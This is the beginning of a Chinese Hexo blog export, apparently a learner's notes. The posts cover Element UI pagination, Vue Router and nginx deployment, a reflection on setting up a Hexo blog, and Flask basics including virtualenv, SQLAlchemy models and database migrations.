<h3 id="4、Vue组件库Element"><a href="#4、Vue组件库Element" class="headerlink" title="4、Vue组件库Element"></a>4、Vue组件库Element</h3><h4 id="1、简单介绍"><a href="#1、简单介绍" class="headerlink" title="1、简单介绍"></a>1、简单介绍</h4><p>不知道同学们还否记得我们之前讲解的前端开发模式MVVM，我们之前学习的vue是侧重于VM开发的，主要用于数据绑定到视图的，那么接下来我们学习的ElementUI就是一款侧重于V开发的前端框架，主要用于开发美观的页面的。</p>
<p>Element：是饿了么公司前端开发团队提供的一套基于 Vue 的网站组件库，用于快速构建网页。</p>
<p>Element 提供了很多组件（组成网页的部件）供我们使用。例如 超链接、按钮、图片、表格等等。如下图所示就是我们开发的页面和ElementUI提供的效果对比：可以发现ElementUI提供的各式各样好看的按钮</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-26/c92b1497ee7ee1c09646c7aaebee97d7--60f3--image-20231126124900304.png" alt="image-20231126124900304"></p>
<p>ElementUI的学习方式和我们之前的学习方式不太一样，对于ElementUI，我们作为一个后台开发者，只需要<strong>学会如何从ElementUI的官网拷贝组件到我们自己的页面中，并且做一些修改即可</strong>。其官网地址：<a href="https://element.eleme.cn/#/zh-CN%EF%BC%8C%E6%88%91%E4%BB%AC%E4%B8%BB%E8%A6%81%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%98%AFElementUI%E4%B8%AD%E6%8F%90%E4%BE%9B%E7%9A%84%E5%B8%B8%E7%94%A8%E7%BB%84%E4%BB%B6%EF%BC%8C%E8%87%B3%E4%BA%8E%E5%85%B6%E4%BB%96%E7%BB%84%E4%BB%B6%E5%90%8C%E5%AD%A6%E4%BB%AC%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E6%88%91%E4%BB%AC%E8%BF%99%E5%87%A0%E4%B8%AA%E7%BB%84%E4%BB%B6%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%8E%8C%E6%8F%A1%E5%88%B0ElementUI%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%8A%80%E5%B7%A7%EF%BC%8C%E7%84%B6%E5%90%8E%E8%AF%BE%E5%90%8E%E8%87%AA%E8%A1%8C%E5%AD%A6%E4%B9%A0%E3%80%82">https://element.eleme.cn/#/zh-CN，我们主要学习的是ElementUI中提供的常用组件，至于其他组件同学们可以通过我们这几个组件的学习掌握到ElementUI的学习技巧，然后课后自行学习。</a></p>
<h4 id="2、快速入门"><a href="#2、快速入门" class="headerlink" title="2、快速入门"></a>2、快速入门</h4><p>首先我们要掌握ElementUI的快速入门，接下来同学们就一起跟着步骤来操作一下。</p>
<p>首先，我们先要安装ElementUI的组件库，打开VS Code，停止之前的项目，然后在命令行输入如下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install element-ui@2.15.3 </span><br></pre></td></tr></table></figure>

<p>然后我们需要在main.js这个入口js文件中引入ElementUI的组件库，其代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">ElementUI</span> <span class="keyword">from</span> <span class="string">&#x27;element-ui&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;element-ui/lib/theme-chalk/index.css&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">ElementUI</span>);</span><br></pre></td></tr></table></figure>

<p>然后我们需要按照vue项目的开发规范，在<strong>src&#x2F;views</strong>目录下创建一个vue组件文件，注意组件名称后缀是.vue，并且在组件文件中编写之前介绍过的基本组件语法，代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>PS:Element组件的所有属性都可以在组件页面的最下方找到</strong>，如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-26/0f0b2aab93e8d8518b669d973dde38c1--6d6a--image-20231126131145410.png" alt="image-20231126131145410"></p>
<h4 id="3、分页组件的使用"><a href="#3、分页组件的使用" class="headerlink" title="3、分页组件的使用"></a>3、分页组件的使用</h4><h5 id="①模块的简单使用介绍"><a href="#①模块的简单使用介绍" class="headerlink" title="①模块的简单使用介绍"></a>①模块的简单使用介绍</h5><p>Pagination: 分页组件，主要提供分页工具条相关功能。其展示效果图下图所示：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-26/7468d1d99b01cb7723ca4c0cd4335452--94ad--image-20231126131705631.png" alt="image-20231126131705631"></p>
<p>首先在官网找到分页组件，我们选择带背景色分页组件，如下图所示：</p>
<p>然后复制代码到我们的ElementView.vue组件文件的template中，拷贝如下代码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">el-pagination</span></span></span><br><span class="line"><span class="tag">    <span class="attr">background</span></span></span><br><span class="line"><span class="tag">    <span class="attr">layout</span>=<span class="string">&quot;prev, pager, next&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">:total</span>=<span class="string">&quot;1000&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">el-pagination</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>对于分页组件我们需要关注的是如下几个重要属性（可以通过查阅官网组件中最下面的组件属性详细说明得到）：</p>
<ul>
<li>background: 添加北京颜色，也就是上图蓝色背景色效果。</li>
<li>layout: 分页工具条的布局，其具体值包含<code>sizes</code>, <code>prev</code>, <code>pager</code>, <code>next</code>, <code>jumper</code>, <code>-&gt;</code>, <code>total</code>, <code>slot</code> 这些值</li>
<li>total: 数据的总数量</li>
</ul>
<p>然后根据官方分页组件提供的layout属性说明，如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-26/e22f237cc331a65a0908fb17c9c2b5b6--af07--image-20231126132145510.png" alt="image-20231126132145510"></p>
<p>我们可以进行相关的自定义</p>
<h5 id="②组件事件"><a href="#②组件事件" class="headerlink" title="②组件事件"></a>②组件事件</h5><p>对于分页组件，除了上述几个属性，还有2个非常重要的事件我们需要去学习：</p>
<ul>
<li>size-change ： pageSize 改变时会触发 </li>
<li>current-change ：currentPage 改变时会触发</li>
</ul>
<p>其官方详细解释含义如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-26/e827629131f4a621175ebf09cc745931--039d--image-20231126132222798.png" alt="image-20231126132222798"></p>
<p>然后我们找到对应的代码，首先复制事件，复制代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">@size-change=<span class="string">&quot;handleSizeChange&quot;</span></span><br><span class="line">@current-change=<span class="string">&quot;handleCurrentChange&quot;</span></span><br></pre></td></tr></table></figure>

<p>此时Panigation组件的template完整代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Pagination分页 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">el-pagination</span></span></span><br><span class="line"><span class="tag">               @<span class="attr">size-change</span>=<span class="string">&quot;handleSizeChange&quot;</span></span></span><br><span class="line"><span class="tag">               @<span class="attr">current-change</span>=<span class="string">&quot;handleCurrentChange&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">background</span></span></span><br><span class="line"><span class="tag">               <span class="attr">layout</span>=<span class="string">&quot;sizes,prev, pager, next,jumper,total&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">:total</span>=<span class="string">&quot;1000&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">el-pagination</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>紧接着需要复制事件需要的2个函数，需要注意methods属性和data同级，其代码如下：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">methods<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      handleSizeChange(val) <span class="punctuation">&#123;</span></span><br><span class="line">        console.log(`每页 $<span class="punctuation">&#123;</span>val<span class="punctuation">&#125;</span> 条`);</span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      handleCurrentChange(val) <span class="punctuation">&#123;</span></span><br><span class="line">        console.log(`当前页<span class="punctuation">:</span> $<span class="punctuation">&#123;</span>val<span class="punctuation">&#125;</span>`);</span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>

<p>此时Panigation组件的script部分完整代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">handleSizeChange</span>(<span class="params">val</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`每页 <span class="subst">$&#123;val&#125;</span> 条`</span>);</span></span><br><span class="line"><span class="language-javascript">      &#125;,</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">handleCurrentChange</span>(<span class="params">val</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`当前页: <span class="subst">$&#123;val&#125;</span>`</span>);</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">     <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">tableData</span>: [&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">date</span>: <span class="string">&#x27;2016-05-02&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>: <span class="string">&#x27;王小虎&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">address</span>: <span class="string">&#x27;上海市普陀区金沙江路 1518 弄&#x27;</span></span></span><br><span class="line"><span class="language-javascript">          &#125;, &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">date</span>: <span class="string">&#x27;2016-05-04&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>: <span class="string">&#x27;王小虎&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">address</span>: <span class="string">&#x27;上海市普陀区金沙江路 1517 弄&#x27;</span></span></span><br><span class="line"><span class="language-javascript">          &#125;, &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">date</span>: <span class="string">&#x27;2016-05-01&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>: <span class="string">&#x27;王小虎&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">address</span>: <span class="string">&#x27;上海市普陀区金沙江路 1519 弄&#x27;</span></span></span><br><span class="line"><span class="language-javascript">          &#125;, &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">date</span>: <span class="string">&#x27;2016-05-03&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>: <span class="string">&#x27;王小虎&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">address</span>: <span class="string">&#x27;上海市普陀区金沙江路 1516 弄&#x27;</span></span></span><br><span class="line"><span class="language-javascript">          &#125;]</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Element库中还有许多各种各样的模块，就不过多去摘抄了，也都可以去官方网站去复制粘贴使用。</p>
<h3 id="5、Vue路由"><a href="#5、Vue路由" class="headerlink" title="5、Vue路由"></a>5、Vue路由</h3><p>首先我们需要先安装vue-router插件，可以通过如下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install vue-router@3.5.1</span><br></pre></td></tr></table></figure>

<p><strong>但是我们不需要安装，因为当初我们再创建项目时，已经勾选了路由功能，已经安装好了。</strong></p>
<p>然后我们需要在<strong>src&#x2F;router&#x2F;index.js</strong>文件中定义路由表，根据其提供的模板代码进行修改，最终代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span>  <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">VueRouter</span>  <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">VueRouter</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/emp&#x27;</span>,  <span class="comment">//地址hash</span></span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;emp&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>:  <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../views/tlias/EmpView.vue&#x27;</span>)  <span class="comment">//对应的vue组件</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/dept&#x27;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;dept&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../views/tlias/DeptView.vue&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">  routes</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>注意需要去掉没有引用的import模块。</p>
<p>在main.js中，我们已经引入了router功能，如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-26/f9cd77e8eaaf0da83921d624361fed4c--012d--image-20231126140930945.png" alt="image-20231126140930945"></p>
<p>路由基本信息配置好了，路由表已经被加载，此时我们还缺少2个东西，就是&lt;router-lin&gt;和&lt;router-view&gt;,所以我们需要修改2个页面（EmpView.vue和DeptView.vue）我们左侧栏的2个按钮为router-link,其代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">index</span>=<span class="string">&quot;1-1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;/dept&quot;</span>&gt;</span>部门管理<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">index</span>=<span class="string">&quot;1-2&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;/emp&quot;</span>&gt;</span>员工管理<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后我们还需要在内容展示区域即App.vue中定义route-view，作为组件的切换，其App.vue的完整代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &#123;&#123;message&#125;&#125; --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;element-view&gt;&lt;/element-view&gt; --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;emp-view&gt;&lt;/emp-view&gt; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">router-view</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// import EmpView  &#x27;./views/tlias/EmpView.vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// import ElementView  &#x27;./views/Element/ElementView.vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">components</span>: &#123; &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="string">&quot;message&quot;</span>:<span class="string">&quot;hello world&quot;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>但是我们浏览器打开地址： <a href="http://localhost:7000/">http://localhost:7000/</a> ，发现一片空白，因为我们默认的路由路径是&#x2F;,但是路由配置中没有对应的关系，</p>
<p>所以我们需要在路由配置中&#x2F;对应的路由组件，代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/emp&#x27;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;emp&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>:  <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../views/tlias/EmpView.vue&#x27;</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/dept&#x27;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;dept&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../views/tlias/DeptView.vue&#x27;</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    <span class="attr">redirect</span>:<span class="string">&#x27;/emp&#x27;</span> <span class="comment">//表示重定向到/emp即可</span></span><br><span class="line">  &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>此时我们打开浏览器，访问<a href="http://localhost:7000/">http://localhost:7000</a> 发现直接访问的是emp的页面，并且能够进行切换了。</p>
<h3 id="6、项目部署打包"><a href="#6、项目部署打包" class="headerlink" title="6、项目部署打包"></a>6、项目部署打包</h3><p>前端打包直接使用npm脚本中的build就行、</p>
<p>然后会在工程目录下生成一个dist目录，用于存放需要发布的前端资源</p>
<p>然后就是项目的部署</p>
<p>将我们之前打包的前端工程dist目录下得内容拷贝到nginx的html目录下</p>
<p>然后启动nginx去启动服务，就成功将该项目部署完成了</p>
<hr>
<p>到这就差不多了这篇，主要就是对java中一些简单的前端知识进行总结。</p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>html</tag>
        <tag>css</tag>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>关于博客搭建的一些自我心得</title>
    <url>/2023/11/09/%E5%85%B3%E4%BA%8E%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E7%9A%84%E4%B8%80%E4%BA%9B%E8%87%AA%E6%88%91%E5%BF%83%E5%BE%97/</url>
    <content><![CDATA[<p>首先，这篇博客并不会详细讲解搭博客的过程什么的，只是稍微分享一下我自己搭博客时遇到的一些问题和学到的一些东西。</p>
<span id="more"></span>

<h1 id="一、博客搭建主体的选择"><a href="#一、博客搭建主体的选择" class="headerlink" title="一、博客搭建主体的选择"></a>一、博客搭建主体的选择</h1><p>我感觉现在大部分主流的使用的博客主体就是两种，(当然主要也是我接触到的博客看好像都是这两种),分别就是hexo和WordPress，不过由于我现在还是囊中羞涩，所以就去使用了免费的github+hexo去搭建，而对于WordPress而言，搭建则需要有一个服务器才能去完成。</p>
<h1 id="二、搭建博客时遇到的一些问题"><a href="#二、搭建博客时遇到的一些问题" class="headerlink" title="二、搭建博客时遇到的一些问题"></a>二、搭建博客时遇到的一些问题</h1><p>博客的普通搭建还是非常简单的，基本就是按照网上的教程来就不会有什么问题的，主要就是主题的配置，这才是最难的。本来我是想着，主题这肯定就是要选个特别好看的啊，这样才炫，所以就选择了ParticleX这个主题，配置完了发现的确很炫啊，然后过了一段时间，我打算吧分类、标签什么的去弄好的时候，就发现也不知道为什么识别不出来创建页面的类型，试了好多方法都不行，就重新搭了，然后就更惨了，发现链代码块都识别错误了，完全没发用，又试了好几次，发现都不行，只能换成最通用的next主题了，😭，不过next主题其实也还不错，稳定而且功能什么的开发的都很全，网上教程很全，又费了一段时间也算成功搭好了。</p>
<h1 id="三、一些小建议"><a href="#三、一些小建议" class="headerlink" title="三、一些小建议"></a>三、一些小建议</h1><p>建议要是很有时间的话就是挑自己喜欢的博客吧，慢慢改改这最后肯定还是很炫的，不是那么在意外观的感觉next就很够用了，至少各种功能方便去配置。还有就是hexo我感觉相对WordPress是没有WordPress方便操作的，毕竟那个还有操作的界面什么的，当然，这也还是主要看个人选择。最重要的不在博客的外观，而在于内容，内容好才是真正好的博客！</p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>blog</tag>
      </tags>
  </entry>
  <entry>
    <title>python学习经历-2-flask</title>
    <url>/2023/11/13/python%E5%AD%A6%E4%B9%A0%E7%BB%8F%E5%8E%86-2-flask/</url>
    <content><![CDATA[<p>接着之前的python进行学习，决定还是从更加实用点的项目相关的知识去学习，这样也可以去更好的实践当中去锻炼自己的能力，所以就选择了flask这个python中的轻量模块去学习。</p>
<span id="more"></span>

<h1 id="一、python中虚拟环境的使用"><a href="#一、python中虚拟环境的使用" class="headerlink" title="一、python中虚拟环境的使用"></a>一、python中虚拟环境的使用</h1><p>python是一个非常常见的编程语言，在python使用过程中，我们总是需要使用到很多需要自己安装下载的库，所以一般一个python编程人员的电脑上都有着许许多多的python库，而在我们去开发一些网站，程序相关的时候，我们并不需要去使用到我们所有的库，并且可能需要去使用某些特定版本的库，可这又应该怎么办？这个时候，虚拟环境也就因此诞生了。</p>
<blockquote>
<p>在使用Python语言时，通过pip（pip3）来安装第三方包，但是由于pip的特性，系统中只能安装每个包的一个版本。但是在实际项目开发中，不同项目可能需要第三方包的不同版本，迫使我们需要根据实际需求不断进行更新或卸载相应的包，而如果我们直接使用本地的Python环境，会导致整体的开发环境相当混乱而不易管理，这时候我们就需要开辟一个独立干净的空间进行开发和部署，虚拟环境就孕育而生。</p>
</blockquote>
<p>下面就直接去记录一下一些虚拟环境的常见使用方法，最流行的就是Virtualenv这个虚拟环境的配置工具</p>
<p>安装：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">pip install virtualenv virtualenvwrapper-win  //windows环境下</span><br></pre></td></tr></table></figure>

<p>查看虚拟环境有哪些</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">workon</span><br></pre></td></tr></table></figure>

<p>创建一个新的虚拟环境</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mkvirtualenv 虚拟环境名</span><br></pre></td></tr></table></figure>

<p>去使用一个虚拟环境</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">workon 虚拟环境名</span><br></pre></td></tr></table></figure>

<p>注意：虚拟环境文件默认在C盘中用户下中的env中</p>
<h1 id="二、数据库中的数据迁移操作"><a href="#二、数据库中的数据迁移操作" class="headerlink" title="二、数据库中的数据迁移操作"></a>二、数据库中的数据迁移操作</h1><p>数据库首先先初始化连接设置</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">db_uri = <span class="string">&#x27;mysql+pymysql://root:password@localhost:3306/bookdb&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;SQLALCHEMY_DATABASE_URI&#x27;</span>] = db_uri</span><br><span class="line">app.config[<span class="string">&#x27;SQLALCHEMY_TRACK_MODIFICATIONS&#x27;</span>] = <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>其次就是模块类的创建，也就相当于数据库中的列</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(db.Model):</span><br><span class="line">    __tablename__ = <span class="string">&#x27;tb_user&#x27;</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>, autoincrement=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">30</span>), unique=<span class="literal">True</span>, index=<span class="literal">True</span>)</span><br><span class="line">    age = db.Column(db.Integer, default=<span class="number">1</span>)</span><br><span class="line">    sex = db.Column(db.Boolean, default=<span class="literal">True</span>)</span><br><span class="line">    salary = db.Column(db.Float, default=<span class="number">10000</span>, nullable=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>为什么要做数据迁移呢？在我的理解中这就相当于一个空白数据库的初始化，将创建的类中的列添加到数据库之中，其实就是相当于我们去创建各个字段的过程。</p>
<p>下面就是用到的命令</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">flask db init   //创建迁移文件夹migrates，只调用一次</span><br><span class="line">flask db migrate //生成迁移文件</span><br><span class="line">flask db upgrade  //执行迁移文件中的升级</span><br><span class="line">flask db downgrade  //执行迁移文件中的降级</span><br></pre></td></tr></table></figure>

<h1 id="三、flask框架中的一些基本操作以及示例"><a href="#三、flask框架中的一些基本操作以及示例" class="headerlink" title="三、flask框架中的一些基本操作以及示例"></a>三、flask框架中的一些基本操作以及示例</h1><h2 id="1、最基础的单文件框架"><a href="#1、最基础的单文件框架" class="headerlink" title="1、最基础的单文件框架"></a>1、最基础的单文件框架</h2><p>文件结构：</p>
<p><img src="http://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-19/4e67729456c911aa9646284ff32250ab--24ca--image-20231119174414920.png" alt="image-20231119174414920"></p>
<blockquote>
<p>static: 静态文件文件夹，用于存放一些像是css，js，image，font等的文件。</p>
<p>templates：用于存放html网站文件</p>
</blockquote>
<p>app.py:（主项目文件）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():  <span class="comment"># put application&#x27;s code here</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index/&#x27;</span></span>) </span><span class="comment">#路由的注册</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello index!&#x27;</span>  <span class="comment">#页面显示的数据</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<p><strong>app运行的时候一些可选的参数：</strong></p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
<th>默认值</th>
</tr>
</thead>
<tbody><tr>
<td>debug</td>
<td>代码更新是否自动重启</td>
<td>False</td>
</tr>
<tr>
<td>theaded</td>
<td>是否开启多线程</td>
<td>False</td>
</tr>
<tr>
<td>port</td>
<td>指定端口</td>
<td>5000</td>
</tr>
<tr>
<td>host</td>
<td>指定主机（设置0.0.0.0可以通过本地IP访问）</td>
<td>127.0.0.1</td>
</tr>
</tbody></table>
